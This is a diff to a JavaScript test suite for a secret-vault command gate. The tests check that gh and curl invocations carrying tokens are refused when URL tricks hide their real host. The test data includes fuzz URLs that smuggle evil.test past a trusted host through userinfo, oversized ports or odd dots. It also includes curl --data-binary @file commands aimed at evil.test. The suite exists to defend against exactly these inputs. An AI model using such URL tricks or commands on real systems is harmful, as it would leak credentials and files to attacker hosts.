@@ -41,6 +41,8 @@
 import fs from 'node:fs';
 import path from 'node:path';
 import crypto from 'node:crypto';
+import cp from 'node:child_process';
+import * as I18N from './i18n-check.mjs';
 import zlib from 'node:zlib';
 import { StringDecoder } from 'node:string_decoder';
 import { createRequire } from 'node:module';
@@ -258,8 +260,72 @@ console.log('④ THE SHAPE KEY — tool + flags + hosts + entries (decision ④)
   { const FUZZ = ["https://ghe.example.test'@evil.test/x", 'https://user@evil.test/x', 'https://u:p@good.com/', 'https://good.com%2eevil.com/', 'http://good.com\u3002evil.com/', 'https://[fd00::1]:8443/x', 'https://host:8443/', 'https://host./', 'https://good.com/path', 'http://127.0.0.1/x', 'postgresql://u@db.internal:5432/x', 'https://'];
     const bad = FUZZ.filter((u) => { let wh = '<bad>', wu = false; try { const w = new URL(u); wh = (w.hostname + (w.port ? ':' + w.port : '')).toLowerCase().replace(/\.$/, '') || '<bad>'; wu = !!(w.username || w.password); } catch {} const r = V.urlParse(u); return (r.bad ? '<bad>' : r.host) !== wh || !!r.userinfo !== wu; });
     ok(!bad.length, 'round 18 (item 1): V.urlParse reads every URL\'s host AND its userinfo flag EXACTLY as the WHATWG new URL (quotes / @ / %-encoding / IPv6 / ports / unicode dot / trailing dot / a legit postgresql user / empty) — no hand-written host regex', bad.map((u) => [u, V.urlParse(u)])); }
+  // round 19 (item 1 BLOCKER): a <url>/<endpoint> the WHATWG parser REJECTS (port > 65535, a numeric last label, a name > 253 / a label > 63, an empty host) is a BLIND authority ⇒ shape.badHost (bad_host at the door), NEVER a dropped host — gh drops a bad port / dials a non-DNS name, so the token would follow it (the daade1a7 leak: the host vanished from routeHosts and the -R host was approved ok:own). A valid :65535 is a real second host (two_hosts, not bad_host).
+  { const bh = (a) => V.shapeOf(V.planOf({ argv: a, env: [['GH_TOKEN', M1]] })).badHost, rh = (a) => V.shapeOf(V.planOf({ argv: a, env: [['GH_TOKEN', M1]] })).routeHosts;
+    ok(bh(['gh', 'issue', 'view', 'https://evil.test:99999/o/r/issues/1', '-R', 'ghe.example.test/o/r']) === true
+      && bh(['gh', 'pr', 'view', 'https://evil.test:65536/o/r/pull/2', '-R', 'ghe.example.test/o/r']) === true
+      && bh(['gh', 'issue', 'comment', 'https://evil.test:99999/o/r/issues/1', '-R', 'ghe.example.test/o/r', '--body', 'x']) === true
+      && bh(['gh', 'api', 'https://evil.test:99999/x', '--hostname', 'ghe.example.test']) === true
+      && bh(['gh', 'issue', 'view', 'https://evil.test.123/o/r/issues/1']) === true
+      && bh(['gh', 'issue', 'view', 'https://' + 'a'.repeat(300) + '/o/r/issues/1', '-R', 'ghe.example.test/o/r']) === true
+      && bh(['gh', 'issue', 'view', 'https://' + 'a'.repeat(64) + '.evil.test/o/r/issues/1', '-R', 'ghe.example.test/o/r']) === true
+      && bh(['gh', 'issue', 'view', 'https:///evil.test/o/r/issues/1', '-R', 'ghe.example.test/o/r']) === true
+      && rh(['gh', 'issue', 'view', 'https://evil.test:65535/o/r/issues/1', '-R', 'ghe.example.test/o/r']).length === 2
+      && bh(['gh', 'issue', 'view', 'https://evil.test:65535/o/r/issues/1', '-R', 'ghe.example.test/o/r']) === false,
+      'round 19 (item 1 BLOCKER): a <url>/<endpoint> the WHATWG parser rejects (port > 65535, numeric last label, name > 253 / label > 63, empty host) ⇒ shape.badHost (bad_host at the door, never a dropped host); a valid :65535 is a real second host (two_hosts, not bad_host)'); }
+  // round 19 (item 2 + 3 + MINOR 1): the locator runs a URL to WHITESPACE so a `, ", < or backtick inside userinfo is read PAST the host (url_userinfo on the curl target, where daade1a7 read the host short); url_userinfo is judged on ROUTE words ONLY (a --body / -d body URL is a mention, never refused); a glued -Rhttps:// / --repo= / GH_REPO= userinfo URL ⇒ url_userinfo (the grammar splits the value, the locator never relies on \b, where daade1a7's scheme read «Rhttps» and dodged).
+  { const UI = (argv, env) => V.shapeOf(V.planOf({ argv, env: env || [[argv[0] === 'gh' ? 'GH_TOKEN' : 'T', M1]] })).userinfo;
+    ok(['`', '"', '<', '>'].every((b) => UI(['curl', '-s', '--data-binary', '@x', 'https://good.example' + b + '@evil.test/x']) === true)
+      && UI(['gh', 'issue', 'list', '-Rhttps://x@ghe.example.test:1@evil.test/o/r']) === true
+      && UI(['gh', 'issue', 'list', '--repo=https://x@ghe.example.test:1@evil.test/o/r']) === true
+      && UI(['gh', 'issue', 'list'], [['GH_REPO', 'https://u@evil.test/o/r'], ['GH_TOKEN', M1]]) === true
+      && UI(['gh', 'issue', 'comment', '5', '-R', 'o/r', '--body', 'mirror at https://deploy@git.example.com/o/r.git']) === false
+      && UI(['curl', '-s', '-d', '{"u":"https://a@evil.test/x"}', 'https://good.example/x']) === false,
+      'round 19 (item 2+3+MINOR): a `, ", < or backtick in userinfo ⇒ url_userinfo on the curl target (read PAST the byte); a glued -Rhttps:// / --repo= / GH_REPO= userinfo URL ⇒ url_userinfo (grammar-split, no \b dodge); a userinfo URL in a --body / -d body is a mention, never refused (route words only)'); }
+  // round 19 (item 3): repoHostOf = go-gh's repository.Parse / Go url.Parse — vectors transcribed from cli/go-gh pkg/repository/repository_test.go (the public Parse vectors; gh 2.102.0 vendors go-gh v2), plus Go url.Parse's LAST-@ rule. null = a default-host (OWNER/REPO) form.
+  { const GOGH = [['monalisa/octo-cat', null], ['monalisa/octo-cat.git', null], ['github.com/monalisa/octo-cat', 'github.com'], ['github.com/monalisa/octo-cat.git', 'github.com'], ['ghe.io/monalisa/octo-cat', 'ghe.io'], ['https://github.com/monalisa/octo-cat', 'github.com'], ['https://github.com/monalisa/octo-cat.git', 'github.com'], ['http://github.com/monalisa/octo-cat', 'github.com'], ['git@github.com:monalisa/octo-cat.git', 'github.com'], ['ssh://git@github.com/monalisa/octo-cat.git', 'github.com'], ['ssh://git@ssh.github.com:443/monalisa/octo-cat.git', 'ssh.github.com'], ['git+ssh://git@github.com/monalisa/octo-cat.git', 'github.com'], ['git+https://github.com/monalisa/octo-cat.git', 'github.com'], ['https://www.github.com/monalisa/octo-cat', 'github.com'], ['https://x@ghe.example.test:1@evil.test/o/r', 'evil.test'], ['ssh://x@ghe.example.test:1@evil.test/o/r', 'evil.test'], ['git+https://x@ghe.example.test:1@evil.test/o/r', 'evil.test']];
+    const ghBad = GOGH.filter(([spec, want]) => V.repoHostOf(spec) !== want);
+    ok(!ghBad.length, "round 19 (item 3): repoHostOf = go-gh's repository.Parse (cli/go-gh pkg/repository/repository_test.go vectors) with Go url.Parse's LAST-@ rule — OWNER/REPO ⇒ default host, HOST/OWNER/REPO ⇒ host, scp-like git@HOST:O/R, ssh/git/https URLs (port dropped, www. stripped), and x@ghe:1@evil ⇒ evil.test (NOT the first-@ ghe)", ghBad.map(([spec, w]) => [spec, 'got ' + V.repoHostOf(spec), 'want ' + w])); }
+  // round 19 (item 4): the curl config-directive table is DERIVED from `curl --help all` and PINNED here — a curl that adds a file-reading / data-@file / url / name=content@file / route option this row does NOT cover is RED BY NAME (version-sensitive, like the gh grammar census).
+  { const curlRow = V.knownToolOf('curl'); let help = null; try { help = cp.execFileSync('curl', ['--help', 'all'], { encoding: 'utf8', timeout: 15000 }); } catch {}
+    if (!help) { if (process.env.CI || process.env.GITHUB_ACTIONS) ok(false, 'curl directive census REQUIRED on the gate but curl is not runnable'); else console.log('  – curl directive census SKIPPED — curl not runnable here'); }
+    else { const covered = new Set([].concat(curlRow.configFileKeys || [], curlRow.configDataKeys || [], curlRow.configAtNameKeys || [], curlRow.configCookieKeys || [], curlRow.configNetrcKeys || [], curlRow.configRouteKeys || [], curlRow.configRedirectKeys || [], curlRow.configFormKeys || [])), shortMap = curlRow.configShort || {}, miss = [];
+      for (const line of help.split('\n')) { const m = /^\s+(?:-([A-Za-z]), )?--([a-z0-9][a-z0-9.-]*)(?:\s+<([^>]+)>)?/.exec(line); if (!m) continue; const short = m[1], long = m[2], arg = (m[3] || '').toLowerCase(); let cat = null;
+        if (/\b(file|filename|dir)\b/.test(arg) || /^cert|^certificate|\bkey$|cert\[/.test(arg)) cat = 'file';
+        else if (arg === 'data' && ['data', 'data-ascii', 'data-binary', 'json', 'url-query'].includes(long)) cat = 'data';
+        else if (/header\/@file/.test(arg)) cat = 'data';
+        else if (long === 'write-out') cat = 'data';
+        else if (/name=text\/@file/.test(arg)) cat = 'atname';
+        else if (arg === 'name=content') cat = 'form';
+        else if (['connect-to', 'resolve', 'proxy', 'preproxy', 'socks4', 'socks4a', 'socks5', 'socks5-hostname', 'url', 'doh-url', 'ipfs-gateway'].includes(long)) cat = 'route';
+        else if (arg === 'data|filename') cat = 'cookie';
+        else if (['location', 'location-trusted', 'proto-redir', 'netrc', 'netrc-optional'].includes(long)) cat = 'special';
+        if (!cat) continue; if (!covered.has(long)) miss.push([long, arg || '(bool)', cat]); else if (short && shortMap[short] !== long) miss.push(['-' + short + ' (short of ' + long + ')', 'short-map']); }
+      const ver = (/curl ([0-9.]+)/.exec(cp.execFileSync('curl', ['--version'], { encoding: 'utf8' })) || [])[1] || '?';
+      ok(!miss.length, `round 19 (item 4): every curl ${ver} file-reading / data-@file / url / name=content@file / route directive (both spellings) is covered by the curl row — a new curl option is RED BY NAME (the derived, pinned census)`, miss); } }
 }
 
+console.log('i18n NOTICE-KEY ROAD (round 18/19 MINOR) — the drift FYI text AND detail keys; the road pinned by RED mutants');
+{
+  const doorSrc = fs.readFileSync(path.join(REPO, 'src/server/vault-run-door.js'), 'utf8');
+  const zhSrc = fs.readFileSync(path.join(REPO, 'src/lib/i18n-zh.js'), 'utf8');
+  const jaSrc = fs.readFileSync(path.join(REPO, 'src/lib/i18n-ja.js'), 'utf8');
+  const dicts = (zt, jt) => [{ name: 'i18n-zh.js', text: zt }, { name: 'i18n-ja.js', text: jt }];
+  const lits = I18N.noticeKeyLiterals(doorSrc);
+  const TEXTK = '{tool} on this machine changed: {from} → {to} (a root-owned tool — runs continue)';
+  const DETAILK = lits.find((k) => /sealed by root ownership/.test(k));
+  ok(lits.includes(TEXTK) && typeof DETAILK === 'string' && I18N.noticeKeyFailures([doorSrc], dicts(zhSrc, jaSrc)).length === 0,
+    'round 19 (MINOR): the road SEES the drift FYI text AND detail: literals (the detail paragraph is new this round), and both resolve in BOTH dicts — shipped clean', { sawDetail: !!DETAILK, fails: I18N.noticeKeyFailures([doorSrc], dicts(zhSrc, jaSrc)) });
+  const strip = (txt, k) => txt.split('\n').filter((l) => !l.includes(k)).join('\n');
+  const r1 = I18N.noticeKeyFailures([doorSrc], dicts(strip(zhSrc, TEXTK), jaSrc));
+  const r2 = I18N.noticeKeyFailures([doorSrc], dicts(zhSrc, strip(jaSrc, DETAILK)));
+  const commentOnly = strip(zhSrc, TEXTK) + '\n  // "' + TEXTK + '": translated elsewhere\n';
+  const r3 = I18N.noticeKeyFailures([doorSrc], dicts(commentOnly, jaSrc));
+  ok(r1.length === 1 && r1[0].dict === 'i18n-zh.js' && r1[0].key === TEXTK
+    && r2.some((x) => x.dict === 'i18n-ja.js' && x.key === DETAILK)
+    && r3.some((x) => x.dict === 'i18n-zh.js' && x.key === TEXTK),
+    'round 19 (MINOR, RED mutants): the text key stripped from zh ⇒ 1 failure naming zh; the detail key stripped from ja ⇒ named (worded MISSING, not duplicate); a key ONLY in a full-line COMMENT does NOT falsely pass (the r18 raw-includes bug) — the road requires a real entry', { r1len: r1.length, r2: r2.filter((x) => x.key === DETAILK), r3: r3.filter((x) => x.key === TEXTK) });
+}
 console.log('①b AN AGENT\'S OWN ENTRY (lane vault-run-door × lane vault-mint-put) — vault://agent:<scope>/<name>');
 {
   const a = V.parseRef('vault://agent:conv-1/github-token'), b = V.parseRef('vault://secrets/agent:conv-1%2Fgithub-token/secret');
@@ -293,7 +359,7 @@ console.log('④b THE SHAPE KEY carries where the secret goes (lane vault-run-do
   const naBad = NA.filter(([argv, why]) => S(argv).noAlways !== why || S(argv).always);
   ok(!naBad.length && S(['curl', 'https://a.example'], { programWritable: true }).noAlways === 'program-writable' && S(['curl', 'https://a.example']).always === true, 'no «always» for a tool that runs the project\'s code, reads a config file the card cannot show, or a program an agent could have written', naBad.map((x) => [x[0][0], S(x[0]).noAlways]));
   const SRC = fs.readFileSync(path.join(REPO, 'src/vault-run.js'), 'utf8');
-  ok(/const URL_FIND_RE = \/\\b\(\[a-z\]\[a-z0-9\+\.-\]\{0,31\}\):/.test(SRC) && !/\[a-z0-9\+\.-\]\*:\\\/\\\//.test(SRC) && S(['curl', 'https://a.example'], { env: [['T', M1], ['P', 'a.'.repeat(32768)]] }).always, 'the URL scan\'s scheme is BOUNDED ({0,31}): an unbounded one walked a 64 KiB «a.a.a…» value quadratically (measured 335 ms at 32 KiB, minutes at a megabyte — the review)');
+  ok(/const URL_FIND_RE = \/\\b\(\[a-z\]\[a-z0-9\+\.-\]\{0,31\}\):/.test(SRC) && !/\[a-z0-9\+\.-\]\*:\\\/\\\//.test(SRC) && SRC.includes(':\\/\\/\\S+/gi') && S(['curl', 'https://a.example'], { env: [['T', M1], ['P', 'a.'.repeat(32768)]] }).always, 'round 19 (item 2): the URL locator runs a token to WHITESPACE (:\\/\\/\\S+) — a `, ", < or backtick inside userinfo is read PAST, never a token boundary — and its scheme is BOUNDED ({0,31}): an unbounded one walked a 64 KiB «a.a.a…» value quadratically (measured 335 ms at 32 KiB — the review)');
 }
 
 console.log('⑤ THE VERDICT — entry × conversation × shape × time');
